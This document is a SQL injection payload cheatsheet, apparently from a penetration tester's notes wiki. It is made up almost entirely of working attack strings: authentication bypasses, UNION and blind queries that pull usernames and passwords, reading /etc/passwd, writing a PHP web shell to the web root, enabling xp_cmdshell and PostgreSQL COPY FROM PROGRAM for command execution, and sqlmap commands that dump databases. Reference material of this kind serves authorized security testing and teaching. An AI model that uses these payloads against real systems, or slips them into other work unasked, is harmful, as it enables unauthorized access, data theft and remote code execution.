# SQLi Payloads Cheatsheet

Quick reference. For theory and testing methodology see [[SQLi-Overview]].

---

## Detection

```sql
'
''
`
')
"))
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' OR 1=1--
" OR 1=1--
OR 1=1--
```

Signs of SQLi:
- SQL error message in response
- Different response for `' OR '1'='1'--` vs normal input
- Response time increase with `' AND SLEEP(5)--`

---

## Auth Bypass

```sql
' OR '1'='1'--
' OR 1=1--
admin'--
admin' #
' OR 'x'='x
' OR 1=1#
') OR ('1'='1
```

---

## Comment Syntax (by Database)

| Database | Comment |
|----------|---------|
| MySQL | `-- -`, `#`, `/**/` |
| MSSQL | `--`, `/**/` |
| PostgreSQL | `--`, `/**/` |
| Oracle | `--`, `/**/` |
| SQLite | `--`, `/**/` |

---

## UNION-Based Injection

```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← when this errors, column count = 2

-- Or use UNION NULL technique
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data (MySQL)
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Error-Based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

---

## Blind Boolean-Based

```sql
-- True condition (response same as normal)
' AND 1=1--

-- False condition (response different)
' AND 1=2--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>90--
```

---

## Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL--
```

---

## Database-Specific Tricks

### MySQL
```sql
-- Version
SELECT @@version
-- Current DB
SELECT database()
-- All tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
-- File read
SELECT LOAD_FILE('/etc/passwd')
-- File write (if FILE privilege)
SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

### MSSQL
```sql
-- Version
SELECT @@version
-- Current DB
SELECT DB_NAME()
-- All databases
SELECT name FROM master..sysdatabases
-- RCE via xp_cmdshell
'; EXEC xp_cmdshell('whoami');--
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

### PostgreSQL
```sql
-- Version
SELECT version()
-- Current DB
SELECT current_database()
-- RCE via COPY
'; COPY cmd_exec FROM PROGRAM 'id';--
'; CREATE TABLE cmd_exec(cmd_output text);--
'; COPY cmd_exec FROM PROGRAM 'whoami';--
'; SELECT * FROM cmd_exec;--
```

### Oracle
```sql
-- Version
SELECT * FROM v$version
-- Tables
SELECT table_name FROM all_tables
-- Dual table (needed for SELECT without FROM in older versions)
SELECT 1 FROM DUAL
```

---

## Tools

```bash
# sqlmap — automated SQLi detection and exploitation
sqlmap -u "https://example.com/page?id=1" --batch --dbs
sqlmap -u "https://example.com/page?id=1" -D dbname --tables
sqlmap -u "https://example.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "https://example.com/login" --data="username=test&password=test" -p username

# From Burp request file
sqlmap -r request.txt --batch
```

---

*Theory and testing methodology: [[SQLi-Overview]] | Related: [[A03-Injection]]*
